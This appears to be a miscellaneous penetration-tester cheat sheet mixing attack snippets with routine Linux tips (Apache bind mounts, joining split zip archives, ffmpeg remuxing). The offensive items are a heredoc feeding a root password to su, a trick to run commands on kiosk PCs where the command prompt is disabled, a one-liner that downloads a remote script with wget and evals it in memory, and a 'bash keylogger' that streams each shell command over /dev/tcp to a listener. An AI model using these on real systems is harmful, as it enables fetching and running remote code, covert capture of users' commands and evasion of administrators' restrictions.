# Random

### Cool heredoc&#x20;

* Use when you are on a `/bin/sh` and need to `su` but dont want to go into a full `tty`

```
su - root <<!
Passw0rd
id
ls /root
!
Password: uid=0(root) gid=0(root) groups=0(root)
Desktop  Documents  Downloads  go  Music  Pictures  Public  Templates  thinclient_drives  Videos
```

### Bypass a disabled command prompt with /k

```
# Win+R (To bring up Run Box)
cmd.exe /k "whoami"
```

**Description:** _'This command prompt has been disabled by your administrator...' Can usually be seen in environments such as kiosks PCs, a quick hacky work around is to use /k via the windows run box. This will carry out the command and then show the restriction message, allowing for command execution._

### _Luks On USBs_

* [https://geekyshacklebolt.wordpress.com/2019/03/06/how-to-encrypt-usb-drives-with-luks/](https://geekyshacklebolt.wordpress.com/2019/03/06/how-to-encrypt-usb-drives-with-luks/)

### Bash In memory exec one liner&#x20;

```
bash -c CMD="`wget -qO- http://<ip>/script.sh`" && eval "$CMD"
```

### Bash Keylogger&#x20;

```
PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'
```

### Apache map external drive to webroot

* Create a directory on the external HDD, assuming it is mounted under the `/media` directory, like so:

```
sudo mkdir /media/web_files
```

* Change the ownership of this directory and all the files under it to be owned by the Apache user `www-data` like so:

```
sudo chown -R www-data:www-data /media/web_files/
```

* Create a directory under the web root directory ie `/var/www/html/` like so:

```
sudo mkdir /var/www/html/external_files
```

* Bind the `/media/web_files/` directory to the `/var/www/html/external_files/` directory like so:

```
sudo mount --bind /media/web_files/ /var/www/html/external_files/
```

* All files on the external HDD under the `/media/web_files/` directory will be available for Apache under the `/var/www/html/external_files/` directory and you can link to them in your web page that resides in `/var/www/html/` like so:

```
<a href="external_files/file1.mp4">file1</a>
```

### Unzip a chunked archive

* you will see files ending in .001, .002 etc etc&#x20;
*   You will need to join them first. You may use the common linux app, `cat` as in the example below:

    ```
    cat test.zip* > ~/test.zip
    ```

    This will concatenate all of your `test.zip.001`, `test.zip.002`, etc files into one larger, test.zip file. Once you have that single file, you may run `unzip test.zip`

## [How to convert .mkv file into .mp4 file losslessly?](https://askubuntu.com/questions/50433/how-to-convert-mkv-file-into-mp4-file-losslessly)

```
ffmpeg -i input.mkv -codec copy output.mp4
```
